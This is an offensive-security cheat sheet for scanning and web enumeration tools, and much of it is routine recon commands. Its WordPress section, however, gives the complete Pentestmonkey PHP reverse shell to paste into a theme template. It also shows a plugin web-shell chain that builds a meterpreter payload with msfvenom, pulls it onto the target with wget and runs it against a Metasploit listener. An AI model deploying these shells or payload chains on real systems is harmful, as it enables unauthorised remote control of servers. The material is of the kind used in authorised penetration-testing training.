<H1>Packet Analyzer</H1>
<details>
<summary>Wireshark</summary>

+ 
    <b>Capture Filters: Net Filter</b>

    ```
    net x.x.x.0/24
    ```

    <li><b>net</b>&ensp;--&ensp;Only Capture Traffic on Specified Range</li>
    <br></br>

    <b>Display Filters: FTP Traffic</b>

    ```
    tcp.port == 21
    ```

    <br></br>
</details>

<details>
<summary>Tcpdump</summary>

+ 
    <b>TCPDump</b>
    
    ```
    tcpdump -i eth0
    ```

    <li><b>-i</b>&ensp;--&ensp;Interface</li>
    <br></br>

    ```
    tcpdump -c -i eth0
    ```

    <li><b>-c</b>&ensp;--&ensp;</li>
    <li><b>-i</b>&ensp;--&ensp;Interface</li>
    <br></br>

    ```
    tcpdump -A -i eth0
    ```

    <li><b>-A</b>&ensp;--&ensp;Print Packets in ASCII</li>
    <li><b>-i</b>&ensp;--&ensp;Interface</li>
    <br></br>

    ```
    tcpdump -w 0001.pcap -i eth0
    ```

    <li><b>-w</b>&ensp;--&ensp;</li>
    <li><b>-i</b>&ensp;--&ensp;Interface</li>
    <br></br>

    ```
    tcpdump -r 0001.pcap
    ```

    <li><b>-r</b>&ensp;--&ensp;Read from Packet Capture</li>
    <br></br>

    ```
    tcpdump -n -i eth0
    ```

    <li><b>-n</b>&ensp;--&ensp;Skip DNS Name Lookup</li>
    <li><b>-i</b>&ensp;--&ensp;Interface</li>
    <br></br>

    ```
    tcpdump -i eth0 port 22
    ```

    <li><b>-i</b>&ensp;--&ensp;Interface</li>
    <br></br>

    ```
    tcpdump -i eth0 -src x.x.x.x
    ```

    <li><b>-i</b>&ensp;--&ensp;Interface</li>
    <li><b>-src</b>&ensp;--&ensp;Source IP Address</li>
    <br></br>

    ```
    tcpdump -i eth0 -dst x.x.x.x
    ```

    <li><b>-i</b>&ensp;--&ensp;Interface</li>
    <li><b>-dst</b>&ensp;--&ensp;Destination IP address</li>
    <br></br>

    <b>Output Traffic from Given Source Host</b>
    ```
    sudo tcpdump -n src host x.x.x.x -r 0001.pcap
    ```

    <li><b>-n</b>&ensp;--&ensp;Skip DNS Name Lookup</li>
    <li><b>src host</b>&ensp;--&ensp;Output Given Traffic only from Given Source Host</li>
    <li><b>-r</b>&ensp;--&ensp;Read from Packet Capture</li>
    <br></br>

    <b>Output Traffic from Given Destination Host</b>
    ```
    sudo tcpdump -n dst host x.x.x.x -r 0001.pcap
    ```

    <li><b>-n</b>&ensp;--&ensp;Skip DNS Name Lookup</li>
    <li><b>dst host</b>&ensp;--&ensp;Output Given Traffic only from Given Destination Host</li>
    <li><b>-r</b>&ensp;--&ensp;Read from Packet Capture</li>
    <br></br>


    <b>Port # Traffic Only</b>

    ```
    sudo tcpdump -n port 81 -r 0001.pcap
    ```

    <li><b>-n</b>&ensp;--&ensp;Skip DNS Name Lookup</li>
    <li><b>port</b>&ensp;--&ensp;Output Given Traffic only from Given Port</li>
    <li><b>-r</b>&ensp;--&ensp;Read from Packet Capture</li>
    <br></br>


    <b>Dump Captured Traffic</b>

    ```
    sudo tcpdump -nX -r 0001.pcap | less
    ```

    <li><b>-n</b>&ensp;--&ensp;Skip DNS Name Lookup</li>
    <li><b>X</b>&ensp;--&ensp;Print Packet Data in both Hex and ASCII Format</li>
    <li><b>-r</b>&ensp;--&ensp;Read from Packet Capture</li>
    <br></br>


    <b>Display Packets with only ACK and PSH Bits Set</b>

    ```
    sudo tcpdump -A -n 'tcp[13] = 24' -r 0001.pcap
    ```

    <li><b>-A</b>&ensp;--&ensp;Print Packets in ASCII</li>
    <li><b>-n</b>&ensp;--&ensp;Skip DNS Name Lookup</li>
    <li><b>-r</b>&ensp;--&ensp;Read from Packet Capture</li>
    <li><b>URG</b>&ensp;--&ensp;32</li>
    <li><b>ACK</b>&ensp;--&ensp;16</li>
    <li><b>PSH</b>&ensp;--&ensp;8</li>
    <li><b>RST</b>&ensp;--&ensp;4</li>
    <li><b>SYN</b>&ensp;--&ensp;2</li>
    <li><b>FIN</b>&ensp;--&ensp;1</li>

    <br></br>
    <b>Find all SYN packets</b>

    ```
    tcpdump 'tcp[13] & 2 != 0'
    ```
    <b>Find all RST packets</b> 

    ```
    tcpdump 'tcp[13] & 4 != 0'
    ```

    <b>Find all ACK packets</b>

    ```
    tcpdump 'tcp[13] & 16 != 0'
    ```
    <br></br>

</details>

<br></br>
<H1>Network Scan</H1>

<details>
<summary>NetDiscover (ARP Scanning)</summary>

+ 
    <b>NetDiscover</b>

    ```
    netdiscover -i eth0
    ```

    <li><b>-i</b>&ensp;--&ensp;Interface</li>
    <br></br>

    ```
    netdiscover -r x.x.x.0/24
    ```

    <li><b>-r</b>&ensp;--&ensp;</li>
    <br></br>
</details>

<details>
<summary>Nmap (Host Discovery)</summary>

+ 
    <b>Nmap Port Scans</b>
    *Note: Run as sudo to prevent missing host*

    ```
    sudo nmap -sn x.x.x.0/24
    ```
    ```
    sudo nmap -sn x.x.x.1-253
    ```
    ```
    sudo nmap -sn x.x.x.*
    ```

    <li><b>-sn</b>&ensp;--&ensp;No port scan / Host Discovery Only</li>
    <br></br>
</details>

<details>
<summary>NBTscan</summary>

+ 
    <br></br>
    <b>NetBIOS Name Enumeration</b>

    ```
    nbtscan -r x.x.x.0/24
    ```

    <li><b>-r</b>&ensp;--&ensp;Use local port 137 for scans</li>
    <br></br>
</details>

<details>
<summary>Linux Ping Sweep (Bash)</summary>

+ 
    <br></br>

    ```
    for i in {1..254} ;do (ping -c 1 x.x.x.$i | grep "bytes from" &) ;done
    ```

    <br></br>
</details>

<details>
<summary>Windows Ping Sweep</summary>

+ 
    <br></br>

    ```
    for /L %i in (1,1,255) do @ping -n 1 -w 200 x.x.x.%i > nul && echo x.x.x.%i is up.
    ```

    <br></br>
</details>
<br></br>

<H1>Port Scan</H1>

<details>
<summary>Nmap</summary>

+ 
    <br></br>
    <b>TCP Scans</b>

    ```
    nmap -sC -sV x.x.x.x
    ```

    <li><b>-sC</b>&ensp;--&ensp;Script Scanning</li>
    <li><b>-sV</b>&ensp;--&ensp;Version Scanning</li>
    <li><b>No Port Listed</b>&ensp;--&ensp;Scans the 1000 most popular ports</li>
    <br></br>

    ```
    nmap -Pn -sC -sV -p- x.x.x.x
    ```

    <li><b>-Pn</b>&ensp;--&ensp;Disable Host Discovery</li>
    <li><b>-sC</b>&ensp;--&ensp;Script Scanning</li>
    <li><b>-sV</b>&ensp;--&ensp;Version Scanning</li>
    <li><b>-p-</b>&ensp;--&ensp;Scan Ports 1-65535</li>
    <br></br>

    ```
    nmap -sV -Pn x.x.x.x
    ```

    <li><b>-sV</b>&ensp;--&ensp;Version Scanning</li>
    <li><b>-Pn</b>&ensp;--&ensp;Disable Host Discovery</li>
    <li><b>No Port Listed</b>&ensp;--&ensp;Scans the 1000 most popular ports</li>
    <br></br>

    ```
    nmap -T4 -sC -sV x.x.x.x
    ```

    <li><b>-T4</b>&ensp;--&ensp;(-T1) Sneaky, (-T2) Polite,(-T3) Normal, (-T4) Aggressive, (-T5) Insane</li>
    <li><b>-sC</b>&ensp;--&ensp;Script Scanning</li>
    <li><b>-sV</b>&ensp;--&ensp;Version Scanning</li>
    <li><b>No Port Listed</b>&ensp;--&ensp;Scans the 1000 most popular ports</li>
    <br></br>

    ```
    nmap -A x.x.x.x
    ```

    <li><b>-A</b>&ensp;--&ensp;Aggressive Scan Options = (-O)(-sV)(-sC)(--traceroute)</li>
    <li><b>-O</b>&ensp;--&ensp;OS Detection</li>
    <li><b>-sV</b>&ensp;--&ensp;Version Scanning</li>
    <li><b>-sC</b>&ensp;--&ensp;Script Scanning</li>
    <li><b>--traceroute</b>&ensp;--&ensp;Traceroute</li>
    <li><b>No Port Listed</b>&ensp;--&ensp;Scans the 1000 most popular ports</li>
    <br></br>

    <b>Stealth/SYN Scans</b>

    ```
    nmap -sS -sC -sV x.x.x.x
    ```

    <li><b>-sS</b>&ensp;--&ensp;TCP SYN Scan | Stealth Scan</li>
    <li><b>-sC</b>&ensp;--&ensp;Script Scanning</li>
    <li><b>-sV</b>&ensp;--&ensp;Version Scanning</li>
    <li><b>No Port Listed</b>&ensp;--&ensp;Scans the 1000 most popular ports</li>
    <br></br>

    ```
    nmap -sS -p- x.x.x.x
    ```

    <li><b>-sS</b>&ensp;--&ensp;TCP SYN Scan | Stealth Scan</li>
    <li><b>-p-</b>&ensp;--&ensp;Scan Ports 1-65535</li>
    <br></br>

    <b>UDP Scans</b>

    ```
    sudo nmap -sS -sU -Pn -sV x.x.x.x
    ```

    <li><b>-sS</b>&ensp;--&ensp;TCP SYN Scan | Stealth Scan</li>
    <li><b>-sU</b>&ensp;--&ensp;UDP Scan</li>
    <li><b>-Pn</b>&ensp;--&ensp;Disable Host Discovery</li>
    <li><b>-sV</b>&ensp;--&ensp;Version Scanning</li>
    <li><b>No Port Listed</b>&ensp;--&ensp;Scans the 1000 most popular ports</li>
    <br></br>

    ```
    sudo nmap -sU -A --top-ports=20 --version-all
    ```

    <li><b>-sU</b>&ensp;--&ensp;UDP Scan</li>
    <li><b>-A</b>&ensp;--&ensp;Aggressive Scan Options = (-O)(-sV)(-sC)(--traceroute)</li>
    <li><b>-O</b>&ensp;--&ensp;OS Detection</li>
    <li><b>-sV</b>&ensp;--&ensp;Version Scanning</li>
    <li><b>-sC</b>&ensp;--&ensp;Script Scanning</li>
    <li><b>--traceroute</b>&ensp;--&ensp;Traceroute</li>
    <li><b>--top-ports=</b>&ensp;--&ensp;Scan # Most Common Ports</li>
    <li><b>--version-all</b>&ensp;--&ensp;Try Every Single Probe (intensity 9)</li>
    <br></br>

    ```
    sudo nmap -sU -A -p 53,67,68,161,162 --version-all
    ```
    <li><b>-sU</b>&ensp;--&ensp;UDP Scan</li>
    <li><b>-A</b>&ensp;--&ensp;Aggressive Scan Options = (-O)(-sV)(-sC)(--traceroute)</li>
    <li><b>-O</b>&ensp;--&ensp;OS Detection</li>
    <li><b>-sV</b>&ensp;--&ensp;Version Scanning</li>
    <li><b>-sC</b>&ensp;--&ensp;Script Scanning</li>
    <li><b>--traceroute</b>&ensp;--&ensp;Traceroute</li>
    <li><b>-p</b>&ensp;--&ensp;Scan Ports Entered</li>
    <li><b>--version-all</b>&ensp;--&ensp;Try Every Single Probe (intensity 9)</li>
    <br></br>

    <b>TCP Connect Scan</b>

    ```
    nmap -sT x.x.x.x
    ```

    <li><b>-sT</b>&ensp;--&ensp;TCP connect scan</li>
    <li><b>No Port Listed</b>&ensp;--&ensp;Scans the 1000 most popular ports</li>
    <br></br>
    <b>Scans through Socks proxy</b>

    ```
    nmap --proxies socks4://proxy-ip:8080 x.x.x.x
    ```

    <li><b>--proxies</b>&ensp;--&ensp;Relay Connection Through HTTP/SOCKS4 Proxies</li>
    <br></br>
    <br></br>

    <b>Nmap Scripts</b>

    ```
    nmap --script vuln,safe,discovery -oN results.txt x.x.x.x
    ```

    <li><b>-oN</b>&ensp;--&ensp;Normal Output .nmap</li>
    <li><b>-oX</b>&ensp;--&ensp;XML Output .xml</li>
    <li><b>--scripts</b>&ensp;--&ensp;Runs a Script Scan using the comma-separated list of filenames</li>
    <br></br>
    <b>Nmap Script Location:</b> 

    ```
    /usr/share/nmap/scripts/
    ```

    <b>Script Description</b>

    ```
    nmap --script-help dns-zone-transfer
    ```

    <br></br>
    <b>--Script Variations:</b> 
    <li><b>--script "http-*"</b>&ensp;--&ensp;Loads all scripts whose name starts with http-</li>
    <li><b>--script "not intrusive"</b>&ensp;--&ensp;Loads every script except for those in the intrusive category</li>
    <li><b>--script "default or safe"</b>&ensp;--&ensp;Loads all scripts that are in the default category or the safe category or both</li>
    <li><b>--script "default and safe"</b>&ensp;--&ensp;Loads those scripts that are in both the default and safe categories</li>
    <li><b>--script "(default or safe or intrusive) and not http-*"</b>&ensp;--&ensp;Loads scripts in the default, safe, or intrusive categories, except for those whose names start with http-.</li>

    <br></br>
</details>

<details>
<summary>Netcat (PortScan)</summary>

+ 
    <br></br>
    <b>TCP Netcat Port Scan</b>

    ```
    nc -nvv -w 1 -z x.x.x.x 1-65535
    ```

    <li><b>-n</b>&ensp;--&ensp;Skip DNS Name Resolution</li>
    <li><b>-v</b>&ensp;--&ensp;Verbose Output</li>
    <li><b>-w</b>&ensp;--&ensp;Connection Timeout in seconds</li>
    <li><b>-z</b>&ensp;--&ensp;Zero IO Mode (Sends no data)</li>
    <br></br>
    <b>UDP Netcat Port</b>

    ```
    nc -nv -u -w 1 -z x.x.x.x 160-162
    ```

    <li><b>-u</b>&ensp;--&ensp;UDP Scan</li>
    <li><b>-n</b>&ensp;--&ensp;Skip DNS Name Resolution</li>
    <li><b>-v</b>&ensp;--&ensp;Verbose Output</li>
    <li><b>-w</b>&ensp;--&ensp;Connection Timeout in seconds</li>
    <li><b>-z</b>&ensp;--&ensp;Zero IO Mode (Sends no data)</li>
    <br></br>
</details>

<details>
<summary>UnicornScan (UDP)</summary>

+ 
    <br></br>

    ```
    unicornscan -mU -p ,161,162,137,123,138,1434,445,135,67,68,53,139,500,637,162,69
    ```

    <li><b>-mU</b>&ensp;--&ensp;</li>
    <li><b>-p</b>&ensp;--&ensp;</li>
    <br></br>
</details>
</details>

<br></br>
<H1>What Services Are Running?</H1>

<details>
<summary>Web</summary>

+ <details>
    <summary>Tips and Tools</summary>

    + <details>
        <summary>Common Wordlists</summary>

        + 
            <br></br>
            <b>Web Directory Enumeration Lists</b>

            ```
            /usr/share/wordlists/dirb/common.txt
            ```
            ```
            /usr/share/wordlists/dirbuster/*.txt
            ```
            ```
            /usr/share/wordlists/wfuzz/general/*.txt
            ```
            ```
            /usr/share/seclists/Discovery/Web-Content/
            ```

            <br></br>
            <b>Common User Enumeration Lists</b>

            ```
            /usr/share/seclists/Usernames
            ```
            ```
            /usr/share/wordlists/dirbuster/apache-user-enum-2.0
            ```

            <br></br>
        </details>
    </details>
    
    <details>
    <summary>Wordpress Vulnerabilites</summary>

    + <details>
        <summary>Editing Theme with Reveres Shell: [Admin Credentials Needed]</summary>

        + 
            <b>Go to Theme editor</b>
            
            ```
            /wp-admin/theme-editor.php
            ```
            
            <b>Example Twenty Twenty-One:404 Template </b>
            
            ```
            /wp-admin/theme-editor.php?file=404.php&theme=twentytwentyone
            ```
            
            <b>Replace contents with Pentestmonkeys Reverse shell</b>
            
            ```
            <?php
            
            set_time_limit (0);
            $VERSION = "1.0";
            $ip = '127.0.0.1';  // CHANGE THIS
            $port = 1234;       // CHANGE THIS
            $chunk_size = 1400;
            $write_a = null;
            $error_a = null;
            $shell = 'uname -a; w; id; /bin/sh -i';
            $daemon = 0;
            $debug = 0;

            //
            // Daemonise ourself if possible to avoid zombies later
            //

            // pcntl_fork is hardly ever available, but will allow us to daemonise
            // our php process and avoid zombies.  Worth a try...
            if (function_exists('pcntl_fork')) {
                // Fork and have the parent process exit
                $pid = pcntl_fork();

                if ($pid == -1) {
                    printit("ERROR: Can't fork");
                    exit(1);
                }

                if ($pid) {
                    exit(0);  // Parent exits
                }

                // Make the current process a session leader
                // Will only succeed if we forked
                if (posix_setsid() == -1) {
                    printit("Error: Can't setsid()");
                    exit(1);
                }

                $daemon = 1;
            } else {
                printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
            }

            // Change to a safe directory
            chdir("/");

            // Remove any umask we inherited
            umask(0);

            //
            // Do the reverse shell...
            //

            // Open reverse connection
            $sock = fsockopen($ip, $port, $errno, $errstr, 30);
            if (!$sock) {
                printit("$errstr ($errno)");
                exit(1);
            }

            // Spawn shell process
            $descriptorspec = array(
               0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
               1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
               2 => array("pipe", "w")   // stderr is a pipe that the child will write to
            );

            $process = proc_open($shell, $descriptorspec, $pipes);

            if (!is_resource($process)) {
                printit("ERROR: Can't spawn shell");
                exit(1);
            }

            // Set everything to non-blocking
            // Reason: Occsionally reads will block, even though stream_select tells us they won't
            stream_set_blocking($pipes[0], 0);
            stream_set_blocking($pipes[1], 0);
            stream_set_blocking($pipes[2], 0);
            stream_set_blocking($sock, 0);

            printit("Successfully opened reverse shell to $ip:$port");

            while (1) {
                // Check for end of TCP connection
                if (feof($sock)) {
                    printit("ERROR: Shell connection terminated");
                    break;
                }

                // Check for end of STDOUT
                if (feof($pipes[1])) {
                    printit("ERROR: Shell process terminated");
                    break;
                }

                // Wait until a command is end down $sock, or some
                // command output is available on STDOUT or STDERR
                $read_a = array($sock, $pipes[1], $pipes[2]);
                $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

                // If we can read from the TCP socket, send
                // data to process's STDIN
                if (in_array($sock, $read_a)) {
                    if ($debug) printit("SOCK READ");
                    $input = fread($sock, $chunk_size);
                    if ($debug) printit("SOCK: $input");
                    fwrite($pipes[0], $input);
                }

                // If we can read from the process's STDOUT
                // send data down tcp connection
                if (in_array($pipes[1], $read_a)) {
                    if ($debug) printit("STDOUT READ");
                    $input = fread($pipes[1], $chunk_size);
                    if ($debug) printit("STDOUT: $input");
                    fwrite($sock, $input);
                }

                // If we can read from the process's STDERR
                // send data down tcp connection
                if (in_array($pipes[2], $read_a)) {
                    if ($debug) printit("STDERR READ");
                    $input = fread($pipes[2], $chunk_size);
                    if ($debug) printit("STDERR: $input");
                    fwrite($sock, $input);
                }
            }

            fclose($sock);
            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);

            // Like print, but does nothing if we've daemonised ourself
            // (I can't figure out how to redirect STDOUT like a proper daemon)
            function printit ($string) {
                if (!$daemon) {
                    print "$string\n";
                }
            }

            ?> 
            ```
           
           <br></br>
           <b>Replace IP and port from these line</b>
           
           ```
           $ip = '127.0.0.1';  // CHANGE THIS
           $port = 1234;       // CHANGE THIS
           ```
           
           <b>Update File Start nc Listener and GO to this directory</b>
           
           ```
           nc -nlvp [LHOST][LPORT]
           ```
           ```
           /wp-content/themes/twentytwentyone/404.php
           ```
        </details>
        
        <details>
        <summary>Upload PHP Shell as Plugin: [Admin Credentials Needed]</summary>
        
        +
            <b>Login to Wordpress Admin Page</b>

            ```
            http://x.x.x.x/wp-admin
            ```

            <b>Enumerate Admin Interface</b>

            Tools/Site Health/Info/Server  
            Tools/Site Health/Info/Database   

            <b>Install Malicious Wordpress Plugin</b>

            ```  
            sudo cp /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php .
            ```
            ```
            sudo zip plugin-shell.zip plugin-shell.php
            ```

            Plugins/Upload Plugin/Browse/plugin-shell.zip/Install Now

            <b>Run Commands From Plugin</b>

            ```
            curl http://x.x.x.x/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
            ```

            <b>Creating a Reverse shell</b>

            ```
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=443 -f elf > shell.elf
            ```

            <b>Start Webserver</b>

            ```
            sudo python3 -m http.server 80
            ```

            <b>Uploading Reverse Shell through Plugin Command</b>

            ```
            curl http://x.x.x.x/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://x.x.x.x/shell.elf
            ```

            <b>Metasploit Listener</b>

            ```
            sudo msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/meterpreter/reverse_tcp;set LHOST x.x.x.x;set LPORT 443;exploit"  
            ``` 

            <b>Make Shell Executable</b>

            ```
            curl http://x.x.x.x/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=chmod%20%2bx%20shell.elf
            ```

            <b>Run Executable</b>  

            ```
            curl http://x.x.x.x/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=./shell.elf
            ```

            <b>Post Exploitation: Gather Basic Information</b>

            <b>From meterpreter shell:</b>

            ```
            shell
            ```
    </details>

    <details>
    <summary>Web App Scanners</summary>

    + <details>
        <summary>Nikto</summary>

        + 
            <br></br>

            ```
            nikto -host=http://x.x.x.x -maxtime=30s -T
            ```

            <li><b>-T</b>&ensp;--&ensp; Tune Scan</li>
            <li><b>-maxtime=</b>&ensp;--&ensp; Stops Scan After # of s=seconds</li>
            <br></br>

        </details>

        <details>
        <summary>WPScan</summary>

        + 
            <br></br>

            ```
            wpscan --url
            ```

            <li><b>--url</b>&ensp;--&ensp;</li>
            <br></br>

            ```
            wpscan --url --enumerate ap at
            ```

            <li><b>--url</b>&ensp;--&ensp;</li>
            <li><b>--enumerate</b>&ensp;--&ensp;</li>
            <li><b>ap</b>&ensp;--&ensp;All Plugins</li>
            <li><b>at</b>&ensp;--&ensp;All Themes</li>
            <br></br>

            ```
            wpscan --url --enumerate u
            ```

            <li><b>--url</b>&ensp;--&ensp;</li>
            <li><b>--enumerate</b>&ensp;--&ensp;</li>
            <li><b>u</b>&ensp;--&ensp;Usernames</li>
            <br></br>

            ```
            wpscan --url --enumerate v
            ```

            <li><b>--url</b>&ensp;--&ensp;</li>
            <li><b>--enumerate</b>&ensp;--&ensp;</li>
            <li><b>v</b>&ensp;--&ensp;</li>
            <br></br>

            ```
            wpscan --url x.x.x.x --enumerate ap,at,cb,dbe - o wpscan -f cli-no-color  
            ```

            <li><b>apl</b>&ensp;--&ensp;all plugins</li>  
            <li><b>at</b>&ensp;--&ensp;All Themes</li>  
            <li><b>cb</b>&ensp;--&ensp;Config Backups</li>  
            <li><b>dbe</b>&ensp;--&ensp;DB Exports</li>  
            <br></br>
        </details>

        <details>
        <summary>Dirb</summary>

        + 
            <br></br>

            ```
            dirb http://x.x.x.x -r -z 10
            ```

            <li><b>-r</b>&ensp;--&ensp;Scan Non-Recursively</li>
            <li><b>-z</b>&ensp;--&ensp;Adds # millisecond delay to each request</li>

            <br></br>
        </details>

        <details>
        <summary>Gobuster</summary>

        + 
            <br></br>

            ```
            gobuster dir -u -w /usr/share/wordlists/
            ```

            <li><b>-u</b>&ensp;--&ensp;</li>
            <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
            <br></br>

            ```
            gobuster dir -u -w /usr/share/wordlists/ a Firefox
            ```

            <li><b>-u</b>&ensp;--&ensp;</li>
            <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
            <li><b>a</b>&ensp;--&ensp;Custom Agent</li>
            <br></br>

            ```
            gobuster dir -u -w /usr/share/wordlists/ -x .php,.txt,.html
            ```

            <li><b>-u</b>&ensp;--&ensp;</li>
            <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
            <li><b>-x</b>&ensp;--&ensp;File Extensions</li>
            <br></br>

            ```
            gobuster dir -u -w /usr/share/wordlists/ -x .php,.txt,.html -s "200"
            ```

            <li><b>-u</b>&ensp;--&ensp;</li>
            <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
            <li><b>-x</b>&ensp;--&ensp;File Extensions</li>
            <li><b>-s</b>&ensp;--&ensp;</li>
            <br></br>

            ```
            gobuster dir -e -u -w /usr/share/wordlists/ -x .php,.txt,.html -s "200"
            ```

            <li><b>-e</b>&ensp;--&ensp;</li>
            <li><b>-u</b>&ensp;--&ensp;</li>
            <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
            <li><b>-x</b>&ensp;--&ensp;File Extensions</li>
            <li><b>-s</b>&ensp;--&ensp;</li>
            <br></br>

            ```
            gobuster dir -v -e -u -w /usr/share/wordlists/ -x .php,.txt,.html -s "200"
            ```

            <li><b>-v</b>&ensp;--&ensp;</li>
            <li><b>-e</b>&ensp;--&ensp;</li>
            <li><b>-u</b>&ensp;--&ensp;</li>
            <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
            <li><b>-x</b>&ensp;--&ensp;File Extensions</li>
            <li><b>-s</b>&ensp;--&ensp;</li>
            <br></br>

            ```
            gobuster dir -v -e -u -w /usr/share/wordlists/ -x .php,.txt,.html -s "200" -o output.txt
            ```

            <li><b>-v</b>&ensp;--&ensp;</li>
            <li><b>-e</b>&ensp;--&ensp;</li>
            <li><b>-u</b>&ensp;--&ensp;</li>
            <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
            <li><b>-x</b>&ensp;--&ensp;File Extensions</li>
            <li><b>-s</b>&ensp;--&ensp;</li>
            <li><b>-o</b>&ensp;--&ensp;Output</li>
            <br></br>

            ```
            gobuster dir -s 200,204,301,302,307,403 -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
            ```

            <li><b>-s</b>&ensp;--&ensp;</li>
            <li><b>-u</b>&ensp;--&ensp;</li>
            <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
            <li><b>-t</b>&ensp;--&ensp;</li>
            <li><b>a</b>&ensp;--&ensp;Custom Agent</li>
            <br></br>
        </details>

        <details>
        <summary>Wfuzz</summary>

        + 
            <br></br>

            ```
            wfuzz -w wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ
            ```

            <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
            <br></br>

            ```
            wfuzz -z range,0-10 --hl 97 http://testphp.vulnweb.com/listproducts.php?cat=FUZZ
            ```

            <li><b>-z</b>&ensp;--&ensp;</li>
            <li><b>--hl</b>&ensp;--&ensp;</li>
            <br></br>

            <b>Post Request</b>

            ```
            wfuzz -z file,wordlist/others/common_pass.txt -d "uname=FUZZ&pass=FUZZ" --hc 302 http://testphp.vulnweb.com/userinfo.php
            ```

            <li><b>-z</b>&ensp;--&ensp;</li>
            <li><b>-d</b>&ensp;--&ensp;</li>
            <li><b>--hc</b>&ensp;--&ensp;</li>
            <br></br>

            <b>Fuzzing Cookies</b>

            ```
            wfuzz -z file,wordlist/general/common.txt -b cookie=value1 -b cookie2=value2 http://testp.vulnweb.com/FUZZ
            ```

            <li><b>-z</b>&ensp;--&ensp;</li>
            <li><b>-b</b>&ensp;--&ensp;</li>
            <br></br>

            <br></br>
        </details>

        <details>
        <summary>Dirsearch</summary>

        + 
            <br></br>

            ```
            dirsearch /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u x.x.x.x -e php
            ```

            <li><b>-u</b>&ensp;--&ensp;</li>
            <li><b>-e</b>&ensp;--&ensp;File Extention</li>
            <br></br>
        </details>

        <details>
        <summary>FFuF</summary>

        + 
            <br></br>

            ```
            ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://x.x.x.x
            ```

            <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
            <li><b>-u</b>&ensp;--&ensp;</li>
            <br></br>

            ```
            ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -b "COOKIE VALUE; security=low" -u http://x.x.x.x
            ```

            <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
            <li><b>-b</b>&ensp;--&ensp;</li>
            <li><b>security=low</b>&ensp;--&ensp;</li>
            <li><b>-u</b>&ensp;--&ensp;</li>
            <br></br>

            ```
            ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://x.x.x.x -fc 403, 302, 200
            ```

            <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
            <li><b>-u</b>&ensp;--&ensp;</li>
            <li><b>-fc</b>&ensp;--&ensp;</li>
            <br></br>

            ```
            ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -H "Host: x.x.x.x" -u http://x.x.x.x
            ```

            <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
            <li><b>-H</b>&ensp;--&ensp;</li>
            <li><b>-u</b>&ensp;--&ensp;</li>
            <br></br>

            ```
            ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://x.x.x.x -timeout 5
            ```

            <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
            <li><b>-u</b>&ensp;--&ensp;</li>
            <li><b>-timeout</b>&ensp;--&ensp;</li>
            <br></br>
        </details>

        <details>
        <summary>Burp Suite</summary>

        + 

            <br></br>
            <b>setup Proxy in Firefox</b>

            ```
            - Add Foxy Proxy extention within Firefox
            - Select Options
            - Select Add
            - Title: BurpSuite
            - Proxy IP Address or DNS name: 127.0.0.1
            - Port: 8080
            - Save
            - Click Foxy Proxy and Select BurpSuite when Ready to use
            ```

            <br></br>
            <b>start BurpSuite "Agree,Temporary Project: Next,Use Burp defaults: Start Burp"</b>

            ```
            burpsuite
            ```

            <br></br>
            <b>Start Proxy on Burp</b>

            ```
            - Proxy Tab
            - Intercept
            - Intercept is on
            ```

            <br></br>
            <b>Pitch Fork Intruder: & Use Response cookies as Parameter</b>

            ```
            Proxy: Send to Intruder
            Intruder: Positions: Attack type = Pitchfork
            Intruder: Positions: Clear Default Parameters
            Intruder: Positions: Add Parameters to Cookies that change and credentials
            Intruder: Options: Grep - Extract: Add " Scroll down to Response window for hidden loggin form values Ex: name="token" value="xxxxx': use x
            Intruder: Payloads: Payload Set = 1, Payload type = recursive grep. Payload sets need to be set for each Parameter set. 
            Intruder: Payloads: For Token values deselect Payload Encoding URL-encode these characters
            Intruder:         : Add new, 1 
            ```

        </details>

        <details>
        <summary>OWASP ZAP (Empty)</summary>

        + 
            <br></br>

            ```
            ```

            <br></br>
        </details>

        <details>
        <summary>Cadaver (Empty)</summary>

        + 
            <br></br>

            ```
            ```

            <br></br>
        </details>

        <details>
        <summary>Joomscan (Empty)</summary>

        + 
            <br></br>

            ```
            ```

            <br></br>
        </details>

        <details>
        <summary>Feroxbuster (Empty)</summary>

        + 
            <br></br>

            ```
            ```

            <br></br>
        </details>
    </details>

    <details>
    <summary>HTTP Servers</summary>

    +
        <br></br>
        <b>Apache2</b>

        ```
        sudo systemctl start apache2
        ```

        <br></br>
        <b>Python2</b>

        ```
        python -m SimpleHTTPServer 7331
        ```

        <li><b>Tip</b>&ensp;--&ensp;Run with root priv to run on system ports</li>

        <br></br>
        <b>Python3</b>

        ```
        python -m http.server 7331
        ```

        <li><b>Tip</b>&ensp;--&ensp;Run with root priv to run on system ports</li>

        <br></br>
        <b>Ruby</b>

        ```
